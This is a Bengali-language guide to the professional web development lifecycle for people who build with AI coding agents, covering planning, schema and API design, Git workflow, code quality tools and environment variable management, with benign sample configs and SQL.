# 🏗️ প্রফেশনাল ওয়েব ডেভেলপমেন্ট লাইফসাইকেল — কমপ্লিট রেফারেন্স গাইড

> **এই ডকুমেন্ট কার জন্য?**
> যারা AI এজেন্ট (Claude, Cursor, Copilot ইত্যাদি) ব্যবহার করে ওয়েবসাইট/ওয়েব অ্যাপ ডেভেলপ করে কিন্তু চায় তাদের আউটপুট যেন "hobby project" না হয়ে একটি রিয়েল প্রফেশনাল প্রোডাক্টের মানের হয়।
>
> **Last Updated:** September 2026

---

## 📑 Table of Contents

| # | সেকশন | বিষয়বস্তু |
|---|--------|-----------|
| 1 | [প্রি-ডেভেলপমেন্ট / প্ল্যানিং](#1--প্রি-ডেভেলপমেন্ট--প্ল্যানিং) | Requirements, scope, tech stack, architecture decisions |
| 2 | [ডেভেলপমেন্ট প্র্যাকটিস](#2--ডেভেলপমেন্ট-প্র্যাকটিস) | Folder structure, Git workflow, code quality, environment management |
| 3 | [সিকিউরিটি](#3--সিকিউরিটি-সবচেয়ে-গুরুত্বপূর্ণ-সেকশন) | OWASP Top 10, auth, secrets, headers, compliance |
| 4 | [টেস্টিং](#4--টেস্টিং) | Unit, integration, E2E, QA checklist |
| 5 | [ডিপ্লয়মেন্ট](#5--ডিপ্লয়মেন্ট) | CI/CD, staging → production, DNS/SSL, backup |
| 6 | [পোস্ট-লঞ্চ / মেইনটেনেন্স](#6--পোস্ট-লঞ্চ--মেইনটেনেন্স) | Monitoring, SEO, performance, accessibility |
| 7 | [ক্লায়েন্ট/বিজনেস হ্যান্ডওভার](#7--ক্লায়েন্টবিজনেস-হ্যান্ডওভার) | Documentation, training, contracts, final audit |
| 8 | [AI এজেন্ট দিয়ে "Vibe Coding" এর নিয়মকানুন](#8--ai-এজেন্ট-দিয়ে-vibe-coding-এর-নিয়মকানুন) | Review, prompting, modular approach, verification |

---

## 🔑 এই গাইডে ব্যবহৃত কিছু চিহ্ন

| চিহ্ন | অর্থ |
|-------|------|
| ✅ | চেকলিস্ট আইটেম — কাজ শেষে টিক দাও |
| ⚠️ | সতর্কতা — এটা skip করলে সমস্যা হতে পারে |
| 💡 | টিপস — প্রফেশনালরা এটা করে |
| 🔒 | সিকিউরিটি সম্পর্কিত |
| 📦 | টুল/সার্ভিসের সুপারিশ |

---

# 1. 📋 প্রি-ডেভেলপমেন্ট / প্ল্যানিং

> **কেন এই ফেজ গুরুত্বপূর্ণ?**
> একটা বিল্ডিং বানানোর আগে আর্কিটেক্ট যেমন ব্লুপ্রিন্ট আঁকে, ওয়েব প্রজেক্টেও ঠিক তেমনি। এই ফেজ skip করলে পরে ৩x-৫x বেশি সময় লাগে ফিক্স করতে — কারণ foundation ঠিক না থাকলে উপরের সব তলা কাঁপে।

---

## 1.1 Requirement Gathering (রিকোয়ারমেন্ট গ্যাদারিং)

**Requirement Gathering** মানে হলো: "ঠিক কী বানাতে হবে, কার জন্য বানাতে হবে, এবং কী কী ফিচার থাকবে" — এই প্রশ্নগুলোর উত্তর বের করা। এটা শুধু ক্লায়েন্টের কাছ থেকে feature list নেওয়া না — বরং তাদের **আসল সমস্যাটা** বোঝা।

### ক্লায়েন্ট/স্টেকহোল্ডারকে যে প্রশ্নগুলো জিজ্ঞেস করতে হবে

| ক্যাটাগরি | জিজ্ঞেস করো |
|-----------|-------------|
| **বিজনেস গোল** | এই ওয়েবসাইট/অ্যাপ দিয়ে আপনি ঠিক কী অর্জন করতে চান? Revenue বাড়ানো? Lead generate করা? Brand awareness? |
| **টার্গেট ইউজার** | কারা ব্যবহার করবে? বয়স, লোকেশন, ডিভাইস (মোবাইল vs ডেস্কটপ), টেকনিক্যাল লেভেল? |
| **কোর ফিচারস** | ক্লায়েন্টকে বলো: "যদি শুধুমাত্র ৩টা ফিচার দিয়ে লঞ্চ করতে হয়, কোন ৩টা দিবেন?" — এটাই তোমার MVP (Minimum Viable Product — সবচেয়ে কম ফিচার দিয়ে একটা কাজ চলে এমন ভার্সন) |
| **কম্পিটিটর** | কোন ওয়েবসাইট/অ্যাপ দেখে তারা inspire হয়েছে? কোন জিনিস তাদের ভালো লাগে/লাগে না? |
| **বাজেট ও টাইমলাইন** | রিয়ালিস্টিক বাজেট কত? ডেডলাইন কবে? |
| **কন্টেন্ট** | কন্টেন্ট (ছবি, টেক্সট, লোগো) কে দিবে — ক্লায়েন্ট না তুমি? কবে পাবে? |
| **থার্ড-পার্টি ইন্টিগ্রেশন** | পেমেন্ট গেটওয়ে, email সার্ভিস, CRM, analytics — কিছু লাগবে কি? |
| **ফিউচার প্ল্যান** | ভবিষ্যতে কি স্কেল করবে? মোবাইল অ্যাপ বানাবে? মাল্টি-ল্যাঙ্গুয়েজ সাপোর্ট লাগবে? |

### ✅ Requirement Gathering চেকলিস্ট

- [ ] ক্লায়েন্টের বিজনেস গোল ডকুমেন্ট করা হয়েছে
- [ ] টার্গেট ইউজার পার্সোনা (কল্পিত ইউজারের প্রোফাইল) তৈরি করা হয়েছে
- [ ] ফিচার লিস্ট **priority সহ** (Must Have / Nice to Have / Future) তৈরি করা হয়েছে
- [ ] কম্পিটিটর অ্যানালাইসিস করা হয়েছে
- [ ] বাজেট ও টাইমলাইন agree করা হয়েছে
- [ ] কন্টেন্ট সোর্স ঠিক করা হয়েছে
- [ ] সব requirement একটা ডকুমেন্টে (Google Docs / Notion) লিখে ক্লায়েন্টের approval নেওয়া হয়েছে

---

## 1.2 Scope Definition ও Scope Creep এড়ানো

**Scope** মানে: "এই প্রজেক্টে ঠিক কী কী কাজ করা হবে এবং কী কী করা হবে না" — এর স্পষ্ট সীমানা।

**Scope Creep** মানে: প্রজেক্ট চলাকালীন ক্লায়েন্ট বারবার নতুন ফিচার যোগ করতে চায়, কিন্তু বাজেট বা টাইমলাইন বাড়ায় না — ফলে তুমি ফ্রি কাজ করো এবং প্রজেক্ট কখনো শেষ হয় না। **এটা ফ্রিল্যান্সারদের #1 সমস্যা।**

### Scope Creep এড়ানোর উপায়

1. **লিখিত Scope Document তৈরি করো** — "এই প্রজেক্টে যা included" এবং "যা included না" — দুটোই স্পষ্ট করে লেখো।

   > **উদাহরণ:**
   > - ✅ Included: Homepage, About page, Contact form, Blog section
   > - ❌ Not Included: E-commerce functionality, Mobile app, Multi-language support

2. **Change Request Process সেট করো** — ক্লায়েন্ট নতুন কিছু চাইলে:
   - নতুন feature-এর জন্য আলাদা quote দাও
   - Timeline কতটুকু বাড়বে সেটা বলো
   - লিখিত approval নাও, তারপর কাজ শুরু করো

3. **MVP-first অ্যাপ্রোচ** — প্রথমে core features দিয়ে লঞ্চ করো, বাকি features পরের ফেজে।

💡 **প্রো টিপ:** প্রজেক্ট শুরুর আগে একটা simple one-page contract-এ scope লিখে সাইন করিয়ে নাও — এমনকি বন্ধুর প্রজেক্ট হলেও।

---

## 1.3 Success Metrics ঠিক করা

**Success Metrics** মানে: "কীভাবে বুঝবো প্রজেক্টটা সফল হয়েছে?" — এটা শুরুতেই ঠিক করতে হয়, নইলে প্রজেক্ট শেষে ক্লায়েন্ট বলবে "ওয়েবসাইট তো কাজ করছে, কিন্তু আমি তো সেল পাচ্ছি না" — এবং তখন দোষ তোমার উপর আসবে।

| সাইটের ধরন | সম্ভাব্য Success Metrics |
|------------|-------------------------|
| **E-commerce** | Conversion rate (কতজন visitor কিনছে), Average order value, Cart abandonment rate |
| **SaaS** | Sign-up rate, Monthly Active Users (MAU), Churn rate (কতজন ছেড়ে যাচ্ছে) |
| **Portfolio/Agency** | Contact form submission, Time on site, Bounce rate (কত দ্রুত চলে যাচ্ছে) |
| **Blog/Content** | Page views, Average session duration, SEO ranking |

---

## 1.4 Tech Stack সিলেকশন

**Tech Stack** মানে: তোমার প্রজেক্ট বানাতে যেসব প্রযুক্তি/টুল/ভাষা ব্যবহার করবে তার সমষ্টি — Frontend framework, Backend language, Database, Hosting — সব মিলিয়ে।

### সঠিক Tech Stack বাছাইয়ের ক্রাইটেরিয়া

⚠️ **কমন ভুল:** "এই framework trending, তাই এটা ব্যবহার করবো।" — এভাবে সিদ্ধান্ত নিও না। নিচের ক্রাইটেরিয়া দিয়ে judge করো:

| ক্রাইটেরিয়া | প্রশ্ন করো নিজেকে |
|-------------|-------------------|
| **প্রজেক্টের ধরন** | Static site? Dynamic web app? Real-time app? E-commerce? — প্রতিটার জন্য আলাদা stack উপযুক্ত |
| **তোমার (বা টিমের) দক্ষতা** | তুমি বা তোমার AI এজেন্ট কোন stack-এ সবচেয়ে ভালো কাজ করে? নতুন stack শেখার সময় আছে? |
| **কমিউনিটি ও ইকোসিস্টেম** | ভালো documentation আছে? Stack Overflow-তে প্রশ্ন করলে উত্তর পাওয়া যায়? প্লাগিন/লাইব্রেরি ইকোসিস্টেম কেমন? |
| **স্কেলেবিলিটি** | ১০০ ইউজার থেকে ১০,০০০ ইউজারে যেতে পারবে কিনা? — অবশ্য এটা শুধু তখনই ভাবো যখন সত্যিই দরকার |
| **খরচ** | Hosting, licensing, third-party services — মাসিক কত পড়বে? ক্লায়েন্ট afford করতে পারে? |
| **লং-টার্ম মেইনটেনেন্স** | এই framework কি active development-এ আছে? নাকি ২ বছর পর deprecated হয়ে যেতে পারে? |
| **হায়ারিং** | ক্লায়েন্ট পরে অন্য ডেভেলপার hire করতে চাইলে এই stack জানা লোক পাওয়া যাবে? |

### প্রজেক্ট টাইপ অনুযায়ী সাজেস্টেড Stack

| প্রজেক্ট টাইপ | Frontend | Backend | Database | Hosting |
|---------------|----------|---------|----------|---------|
| **Simple website / Portfolio** | HTML/CSS/JS বা Next.js | দরকার নেই বা Headless CMS | দরকার নেই | Vercel, Netlify |
| **Blog / Content site** | Next.js, Astro | Headless CMS (Sanity, Strapi) | PostgreSQL / SQLite | Vercel, Cloudflare Pages |
| **SaaS / Web App** | Next.js, React + Vite | Node.js (Express/Fastify) বা Python (Django/FastAPI) | PostgreSQL | AWS, Railway, Render |
| **E-commerce** | Next.js | Shopify API / Medusa.js / custom | PostgreSQL | Vercel + managed DB |
| **Real-time app** (chat, collab) | React + Socket.io client | Node.js + Socket.io | PostgreSQL + Redis | AWS / Railway |

> 📦 **Headless CMS** = একটা content management system যেখানে ক্লায়েন্ট ব্লগ পোস্ট, ইমেজ ইত্যাদি ম্যানেজ করতে পারে, কিন্তু frontend তুমি আলাদা বানাও — WordPress-এর মতো কিন্তু frontend locked না।
>
> 📦 **Redis** = একটা খুব দ্রুত in-memory database — মূলত caching (ডাটা দ্রুত access করার জন্য temporary স্টোর) এবং real-time features-এর জন্য ব্যবহার হয়।

---

## 1.5 Sitemap ও Wireframe

### Sitemap

**Sitemap** = তোমার ওয়েবসাইটের সব পেজের একটা ম্যাপ — কোন পেজ থেকে কোন পেজে যাওয়া যায়, hierarchy কী।

কোডিং শুরুর আগে একটা simple sitemap বানাও — Google Docs-এ বুলেট পয়েন্টেও হতে পারে:

```
Homepage
├── About
├── Services
│   ├── Web Development
│   ├── Mobile App
│   └── UI/UX Design
├── Portfolio
│   └── Case Study (dynamic)
├── Blog
│   └── Blog Post (dynamic)
├── Contact
├── Login / Register
├── Dashboard (authenticated)
│   ├── Profile
│   ├── Projects
│   └── Settings
├── Privacy Policy
└── Terms of Service
```

### Wireframe

**Wireframe** = প্রতিটা পেজের একটা rough layout sketch — "কোথায় header হবে, কোথায় hero section, কোথায় CTA button" — ডিজাইন ছাড়া শুধু structure।

📦 **টুলস:**
- **Figma** (ফ্রি) — ইন্ডাস্ট্রি স্ট্যান্ডার্ড ডিজাইন টুল; wireframe থেকে full UI design সব করা যায়
- **Excalidraw** (ফ্রি) — খুব quick, hand-drawn style diagram/wireframe বানানোর জন্য
- **কাগজ-কলম** — সিরিয়াসলি, প্রথম wireframe কাগজে এঁকে ফেলো, সেটাই সবচেয়ে দ্রুত

---

## 1.6 Database Schema ডিজাইন

**Database Schema** = তোমার ডাটাবেজে কী কী table/collection থাকবে, প্রতিটায় কী কী field থাকবে, এবং table-গুলো একে অপরের সাথে কীভাবে সম্পর্কিত — এই ব্লুপ্রিন্ট।

### কেন আগে থেকে Schema ডিজাইন করা দরকার?

পরে schema বদলানো মানে:
- Existing ডাটা migrate করতে হবে (migration — ডাটা এক structure থেকে অন্য structure-এ নিয়ে যাওয়া)
- অনেক কোড re-write করতে হবে
- Bug আসার risk বাড়বে

### Schema ডিজাইনের বেসিক প্রিন্সিপাল

1. **Normalization (নরমালাইজেশন):** একই ডাটা বারবার store করো না — আলাদা table-এ রাখো এবং reference দিয়ে connect করো।

   > **উদাহরণ:** প্রতিটা order-এ পুরো customer address বারবার না লিখে, `customers` table-এ address রাখো এবং order-এ শুধু `customer_id` রাখো।

2. **প্রতিটা table-এ Primary Key থাকবে** — একটা unique identifier (সাধারণত `id`) যেটা দিয়ে প্রতিটা row কে আলাদাভাবে চেনা যায়।

3. **Timestamps রাখো** — `created_at` এবং `updated_at` — প্রতিটা table-এ। পরে debugging-এ অনেক কাজে লাগে।

4. **Soft Delete ব্যবহার করো** — ডাটা সত্যিই delete না করে একটা `deleted_at` field ব্যবহার করো। কেন? ভুলে কিছু delete হলে recover করা যায়।

### উদাহরণ Schema (একটা simple SaaS-এর জন্য)

```sql
-- Users table
CREATE TABLE users (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  email VARCHAR(255) UNIQUE NOT NULL,
  password_hash VARCHAR(255) NOT NULL,    -- ⚠️ কখনো plain password store করো না!
  full_name VARCHAR(255),
  role VARCHAR(50) DEFAULT 'user',        -- 'admin', 'user', 'editor'
  email_verified_at TIMESTAMP,
  created_at TIMESTAMP DEFAULT NOW(),
  updated_at TIMESTAMP DEFAULT NOW(),
  deleted_at TIMESTAMP                     -- Soft delete
);

-- Projects table
CREATE TABLE projects (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID REFERENCES users(id),      -- Foreign key — কোন user-এর project
  title VARCHAR(255) NOT NULL,
  description TEXT,
  status VARCHAR(50) DEFAULT 'draft',     -- 'draft', 'active', 'archived'
  created_at TIMESTAMP DEFAULT NOW(),
  updated_at TIMESTAMP DEFAULT NOW()
);
```

📦 **Schema ডিজাইন টুল:**
- **dbdiagram.io** (ফ্রি) — ব্রাউজারে visual database diagram বানানো যায়
- **DrawSQL** (ফ্রি) — সুন্দর ER diagram তৈরি করা যায়
- **Prisma Schema** — যদি Prisma ORM ব্যবহার করো, তাহলে `schema.prisma` ফাইলেই ডিজাইন হয়ে যায়

> 📦 **ORM (Object-Relational Mapping)** = একটা টুল যেটা তোমাকে raw SQL না লিখে JavaScript/Python-এর মতো ভাষায় database query করতে দেয়। যেমন: Prisma (Node.js), SQLAlchemy (Python), Drizzle (Node.js)।

---

## 1.7 API Contract ডিজাইন

**API (Application Programming Interface)** = তোমার frontend এবং backend-এর মধ্যে কথা বলার একটা নিয়মিত পদ্ধতি। Frontend বলছে "আমাকে সব products দাও" — Backend API দিয়ে সেই data পাঠাচ্ছে।

**API Contract** = "কোন URL-এ কী request পাঠালে কী format-এ response আসবে" — এটা আগে থেকে ডকুমেন্ট করে রাখা।

### কেন আগে থেকে API Contract লেখা দরকার?

- Frontend ও Backend developer (বা তোমার AI agent) parallel কাজ করতে পারে
- পরে "এই field-টা কী নামে আসবে?" নিয়ে confusion হয় না
- Testing সহজ হয় — কারণ expected output আগে থেকেই জানা

### API Contract উদাহরণ

```
GET /api/v1/products
Response 200:
{
  "data": [
    {
      "id": "uuid",
      "name": "Product Name",
      "price": 1500.00,
      "currency": "BDT",
      "category": "electronics",
      "in_stock": true
    }
  ],
  "pagination": {
    "page": 1,
    "per_page": 20,
    "total": 150
  }
}

POST /api/v1/products
Headers: Authorization: Bearer <token>
Body:
{
  "name": "New Product",
  "price": 2000.00,
  "category": "electronics"
}
Response 201:
{
  "data": { "id": "new-uuid", ... },
  "message": "Product created successfully"
}
```

### API ডিজাইনের কিছু নিয়ম (RESTful conventions)

**REST (Representational State Transfer)** = API ডিজাইনের সবচেয়ে জনপ্রিয় style — URL গুলো resource-এর নামে হয়, HTTP method (GET, POST, PUT, DELETE) দিয়ে action বোঝায়।

| HTTP Method | মানে | উদাহরণ |
|-------------|------|--------|
| `GET` | ডাটা পড়া | `GET /api/users` — সব user দেখাও |
| `POST` | নতুন কিছু তৈরি করা | `POST /api/users` — নতুন user তৈরি করো |
| `PUT` / `PATCH` | আপডেট করা | `PUT /api/users/123` — user 123 আপডেট করো |
| `DELETE` | মুছে ফেলা | `DELETE /api/users/123` — user 123 মুছে ফেলো |

💡 **প্রো টিপস:**
- URL-এ plural noun ব্যবহার করো: `/api/users` ✅, `/api/getUser` ❌
- Version রাখো: `/api/v1/...` — পরে breaking change এলে `/api/v2/` বানাতে পারবে
- Consistent error format রাখো:

```json
{
  "error": {
    "code": "VALIDATION_ERROR",
    "message": "Email is required",
    "details": [
      { "field": "email", "message": "This field is required" }
    ]
  }
}
```

📦 **API Documentation Tool:** **Swagger/OpenAPI** — API-এর interactive documentation তৈরি করে, যেখানে সরাসরি API test-ও করা যায়।

---

## 1.8 Architecture Decision

### Monolith vs Microservice

| | Monolith (মনোলিথ) | Microservice (মাইক্রোসার্ভিস) |
|--|-------------------|-------------------------------|
| **কী?** | পুরো application একটা single codebase-এ, একসাথে deploy হয় | Application অনেকগুলো ছোট ছোট independent service-এ ভাগ করা, প্রতিটা আলাদাভাবে deploy হয় |
| **Analogy** | একটা বড় রেস্তোরাঁ যেখানে রান্না, সার্ভিং, ক্যাশ সব একজায়গায় | একটা ফুড কোর্ট যেখানে প্রতিটা স্টল আলাদা, কিন্তু একসাথে কাজ করে |
| **কখন ব্যবহার?** | ৯০% প্রজেক্টে — বিশেষ করে শুরুতে, ছোট টিমে, MVP-তে | যখন সত্যিই massive scale দরকার (Netflix, Amazon level) |
| **সুবিধা** | Simple, দ্রুত develop হয়, debug সহজ | Independent scaling, এক service crash করলে বাকিগুলো চলে |
| **অসুবিধা** | পুরো app একসাথে deploy করতে হয় | Complex, আলাদা আলাদা service manage করা কঠিন, ছোট টিমে overkill |

⚠️ **সোজা কথা:** তুমি যদি solo developer হও বা ছোট টিমে কাজ করো — **Monolith দিয়ে শুরু করো।** Microservice পরে দরকার হলে migrate করা যাবে। অনেক বড় বড় কোম্পানি (Shopify, Basecamp) monolith দিয়েই চলছে।

### SSR vs CSR vs SSG

| | SSR (Server-Side Rendering) | CSR (Client-Side Rendering) | SSG (Static Site Generation) |
|--|---------------------------|---------------------------|----------------------------|
| **কী?** | সার্ভারে HTML তৈরি হয়, ব্রাউজারে পাঠায় | ব্রাউজারে JavaScript চলে, সেখানে HTML তৈরি হয় | Build-এর সময় সব HTML আগে থেকে তৈরি করে রাখে |
| **Analogy** | রেস্তোরাঁয় রান্না হয়ে প্লেটে এসে পড়ে | তোমাকে ingredient দেয়, তুমি নিজে রান্না করো | আগে থেকে রান্না করে ফ্রিজে রাখা, order এলে শুধু serve |
| **SEO** | ✅ ভালো | ❌ খারাপ (Google bot JavaScript সবসময় ঠিকমতো execute করে না) | ✅ সবচেয়ে ভালো |
| **Initial Load** | মোটামুটি দ্রুত | ধীর (বড় JS bundle download করতে হয়) | সবচেয়ে দ্রুত |
| **কখন?** | Dynamic content + SEO দরকার (e-commerce, news) | Dashboard, internal tools (SEO দরকার নেই) | Blog, portfolio, marketing site (content কম বদলায়) |
| **Framework** | Next.js, Nuxt.js | React (Vite), Vue, Angular | Astro, Next.js (static export), Hugo |

💡 **প্রো টিপ:** Next.js দিয়ে তুমি SSR, CSR, SSG — তিনটাই **একই প্রজেক্টে** মিক্স করে ব্যবহার করতে পারো। Page-ভিত্তিক সিদ্ধান্ত নিতে পারো।

### ✅ প্রি-ডেভেলপমেন্ট ফাইনাল চেকলিস্ট

- [ ] Requirements ডকুমেন্ট তৈরি ও ক্লায়েন্ট approval নেওয়া হয়েছে
- [ ] Scope document (included/excluded) তৈরি ও সাইন করা হয়েছে
- [ ] Success metrics ঠিক করা হয়েছে
- [ ] Tech stack সিলেক্ট ও justify করা হয়েছে
- [ ] Sitemap তৈরি করা হয়েছে
- [ ] Wireframe (অন্তত key pages) তৈরি করা হয়েছে
- [ ] Database schema ডিজাইন করা হয়েছে
- [ ] API contract ডকুমেন্ট করা হয়েছে (backend থাকলে)
- [ ] Architecture decision (monolith/micro, SSR/CSR/SSG) নেওয়া ও documented হয়েছে
- [ ] Project timeline (phase-wise) তৈরি করা হয়েছে
- [ ] Git repository তৈরি করা হয়েছে

---

# 2. 🛠️ ডেভেলপমেন্ট প্র্যাকটিস

> **কেন এই সেকশন গুরুত্বপূর্ণ?**
> কোড তো AI-ও লিখতে পারে। কিন্তু প্রফেশনাল আউটপুট আর "কাজ চলে এমন" আউটপুটের মধ্যে পার্থক্য হলো — **structure, consistency, এবং maintainability।** ৬ মাস পর তোমার নিজের কোড যেন তুমি নিজে বুঝতে পারো — এটাই লক্ষ্য।

---

## 2.1 প্রফেশনাল ফোল্ডার স্ট্রাকচার

একটা ভালো ফোল্ডার স্ট্রাকচারের মানে হলো — যেকোনো ডেভেলপার (বা ভবিষ্যতের তুমি) প্রজেক্টে ঢুকে ৫ মিনিটের মধ্যে বুঝতে পারবে কী কোথায় আছে।

### Next.js / React প্রজেক্টের জন্য সাজেস্টেড স্ট্রাকচার

```
project-root/
├── .github/                    # GitHub-specific config
│   └── workflows/              # CI/CD pipeline definitions
│       └── deploy.yml
├── public/                     # Static assets (images, fonts, favicon)
│   ├── images/
│   └── favicon.ico
├── src/                        # সব source code এখানে
│   ├── app/                    # Next.js App Router pages
│   │   ├── (auth)/             # Route group — auth-related pages
│   │   │   ├── login/
│   │   │   └── register/
│   │   ├── dashboard/
│   │   ├── layout.tsx
│   │   └── page.tsx
│   ├── components/             # Reusable UI components
│   │   ├── ui/                 # Generic UI (Button, Input, Modal)
│   │   ├── forms/              # Form-specific components
│   │   ├── layout/             # Header, Footer, Sidebar
│   │   └── features/           # Feature-specific components
│   ├── lib/                    # Utility functions, helpers
│   │   ├── utils.ts
│   │   ├── constants.ts
│   │   └── validations.ts
│   ├── hooks/                  # Custom React hooks
│   ├── services/               # API call functions
│   │   ├── api.ts              # Base API client setup
│   │   ├── auth.service.ts
│   │   └── product.service.ts
│   ├── stores/                 # State management (Zustand/Redux)
│   ├── types/                  # TypeScript type definitions
│   │   ├── user.types.ts
│   │   └── product.types.ts
│   ├── styles/                 # Global styles
│   │   └── globals.css
│   └── middleware.ts           # Next.js middleware (auth checks, redirects)
├── prisma/                     # Database schema & migrations (if using Prisma)
│   ├── schema.prisma
│   └── migrations/
├── tests/                      # Test files
│   ├── unit/
│   ├── integration/
│   └── e2e/
├── docs/                       # Project documentation
├── scripts/                    # Utility scripts (seed DB, deploy, etc.)
├── .env.example                # Environment variable template (safe to commit)
├── .env.local                  # Actual env values (⚠️ NEVER commit this!)
├── .gitignore
├── .eslintrc.json              # Linting rules
├── .prettierrc                 # Code formatting rules
├── next.config.js
├── package.json
├── tsconfig.json
└── README.md
```

### Key Principles (মূল নীতি)

1. **Separation of Concerns** — প্রতিটা ফোল্ডার একটা নির্দিষ্ট কাজের জন্য। Components ফোল্ডারে API call থাকবে না, services ফোল্ডারে UI code থাকবে না।

2. **Co-location** — একটা feature-এর সাথে সম্পর্কিত সব ফাইল কাছাকাছি রাখো। যেমন: `dashboard/` ফোল্ডারে dashboard-এর page, components, এবং hooks একসাথে থাকতে পারে।

3. **Index Exports** — প্রতিটা major ফোল্ডারে `index.ts` ফাইল রাখো যেটা সেই ফোল্ডারের public API হিসেবে কাজ করে — import path ছোট হয়।

---

## 2.2 Git Workflow

**Git** = তোমার কোডের "version history" — প্রতিটা change-এর record রাখে, যেকোনো সময় আগের version-এ ফিরে যেতে পারো। ভাবো এটা কোডের "Ctrl+Z on steroids"।

### Branching Strategy (ব্রাঞ্চিং স্ট্র্যাটেজি)

**Branch** = কোডের একটা আলাদা copy যেখানে তুমি নতুন ফিচার বানাও, main কোড নষ্ট হওয়ার risk ছাড়া।

#### তোমার জন্য সাজেস্টেড: Simplified Git Flow

```
main (production code — সবসময় stable, deploy-ready)
  │
  ├── develop (development branch — নতুন ফিচার এখানে merge হয়)
  │     │
  │     ├── feature/user-auth      ← নতুন ফিচারের জন্য
  │     ├── feature/product-page   ← আরেকটা ফিচার
  │     ├── bugfix/login-error     ← bug fix
  │     └── hotfix/security-patch  ← জরুরি fix, সরাসরি main-এও যায়
  │
  └── staging (testing branch — production deploy-এর আগে এখানে test হয়)
```

**কীভাবে কাজ করে:**
1. নতুন ফিচার বানাতে `develop` থেকে `feature/xyz` branch তৈরি করো
2. কাজ শেষে Pull Request (PR) দিয়ে `develop`-এ merge করো
3. `develop` stable হলে `staging`-এ merge করে test করো
4. সব ঠিক থাকলে `main`-এ merge করো → Production deploy হয়

> 📦 **Pull Request (PR)** = তোমার branch-এর changes main branch-এ যোগ করার "অনুমতি চাওয়া"। এখানে কোড review হয়, অন্যরা (বা তুমি নিজে) দেখে approve করো।

### Commit Message Convention

**Commit** = Git-এ একটা save point — "এই মুহূর্তে কোডের অবস্থা এটা" বলে রেকর্ড রাখা।

ভালো commit message লেখা গুরুত্বপূর্ণ কারণ — ৩ মাস পর git history দেখে বুঝতে হবে কী change হয়েছিল এবং কেন।

**Conventional Commits ফরম্যাট ব্যবহার করো:**

```
<type>(<scope>): <short description>

[optional body - বিস্তারিত বিবরণ]
[optional footer - breaking changes, issue references]
```

| Type | কখন ব্যবহার করবে | উদাহরণ |
|------|-------------------|--------|
| `feat` | নতুন feature | `feat(auth): add Google OAuth login` |
| `fix` | Bug fix | `fix(cart): resolve item count not updating` |
| `docs` | Documentation পরিবর্তন | `docs: update API documentation` |
| `style` | Code formatting (logic বদলায়নি) | `style: fix indentation in user component` |
| `refactor` | Code restructure (behavior বদলায়নি) | `refactor(api): extract validation logic` |
| `test` | Test যোগ করা/পরিবর্তন | `test(auth): add login flow tests` |
| `chore` | Build process, tooling change | `chore: update dependencies` |
| `perf` | Performance improvement | `perf(images): add lazy loading` |
| `security` | Security fix | `security: sanitize user input in search` |

⚠️ **কমন ভুল commit messages (এগুলো কখনো লিখো না):**
- ❌ `"fix stuff"`
- ❌ `"update"`
- ❌ `"asdasd"`
- ❌ `"final fix (hopefully)"`

### .gitignore — কী কী Git-এ commit করবে না

```gitignore
# Dependencies
node_modules/

# Environment files (SECRETS থাকে!)
.env
.env.local
.env.production

# Build output
.next/
dist/
build/

# IDE files
.vscode/
.idea/

# OS files
.DS_Store
Thumbs.db

# Logs
*.log

# Database files
*.sqlite
```

⚠️ **সবচেয়ে গুরুত্বপূর্ণ:** `.env` ফাইল **কখনোই** Git-এ commit করো না। একবার commit হয়ে গেলে, delete করলেও Git history-তে থেকে যায়। কেউ history ঘেঁটে তোমার API key, database password পেয়ে যেতে পারে।

---

## 2.3 Code Quality Tools

### Linting (লিন্টিং)

**Linter** = একটা টুল যেটা তোমার কোডে common mistakes, bad practices, এবং potential bugs ধরে — কোড run করার আগেই।

📦 **ESLint** — JavaScript/TypeScript-এর জন্য সবচেয়ে জনপ্রিয় linter।

```json
// .eslintrc.json — বেসিক configuration
{
  "extends": [
    "next/core-web-vitals",
    "eslint:recommended",
    "plugin:@typescript-eslint/recommended"
  ],
  "rules": {
    "no-console": "warn",
    "no-unused-vars": "error",
    "@typescript-eslint/no-explicit-any": "warn"
  }
}
```

### Formatting (ফরম্যাটিং)

📦 **Prettier** — কোডের formatting (indentation, spacing, quotes) automatically ঠিক করে দেয়। পুরো টিমের কোড একই style-এ থাকে।

```json
// .prettierrc
{
  "semi": true,
  "singleQuote": true,
  "tabWidth": 2,
  "trailingComma": "es5",
  "printWidth": 100
}
```

### Type Checking (টাইপ চেকিং)

📦 **TypeScript** — JavaScript-এর উপর একটা layer যেটা variable-এর type (number, string, object) check করে — অনেক bug কোড run করার আগেই ধরা পড়ে।

```typescript
// ❌ JavaScript — runtime-এ crash করবে, আগে বুঝতে পারবে না
function calculateTotal(price, quantity) {
  return price * quantity;
}

// ✅ TypeScript — compile-time-এই error দিবে
function calculateTotal(price: number, quantity: number): number {
  return price * quantity;
}
```

### Pre-commit Hooks

**Pre-commit Hook** = Git commit করার ঠিক আগে automatically কিছু check চালানো (linting, formatting, test) — যাতে "খারাপ" কোড কখনো commit না হয়।

📦 **Husky** + **lint-staged** — এই দুটো package মিলে pre-commit hook সেটআপ করে।

```json
// package.json-এ যোগ করো
{
  "lint-staged": {
    "*.{ts,tsx}": [
      "eslint --fix",
      "prettier --write"
    ]
  }
}
```

**কীভাবে কাজ করে:**
1. তুমি `git commit` করো
2. Husky automatically lint-staged চালায়
3. শুধু changed files-এ ESLint + Prettier চলে
4. কোনো error থাকলে commit হবে না — আগে fix করতে হবে
5. সব ঠিক থাকলে commit হয়ে যায়

---

## 2.4 Environment Management

**Environment** = তোমার application কোন context-এ চলছে — development (তোমার laptop), staging (test server), production (real users)। প্রতিটায় আলাদা configuration দরকার (database URL, API keys ইত্যাদি)।

### কেন আলাদা Environment রাখা দরকার?

- **Development** — তোমার local machine-এ চলছে, fake data দিয়ে test করছো
- **Staging** — Production-এর exact copy, কিন্তু real users নেই — final testing এখানে হয়
- **Production** — Real users ব্যবহার করছে, real data আছে

⚠️ **কখনোই production database-এ "test" করো না!** একটা ভুল query দিয়ে সব user-এর data মুছে যেতে পারে।

### .env ফাইল ম্যানেজমেন্ট

```bash
# .env.example — Git-এ commit হবে (template হিসেবে)
# এতে real values থাকবে না, শুধু variable-এর নাম আর placeholder
DATABASE_URL=postgresql://user:password@localhost:5432/mydb
JWT_SECRET=your-secret-key-here
STRIPE_SECRET_KEY=sk_test_xxxx
NEXT_PUBLIC_API_URL=http://localhost:3000/api

# .env.local — Git-এ commit হবে না (actual values)
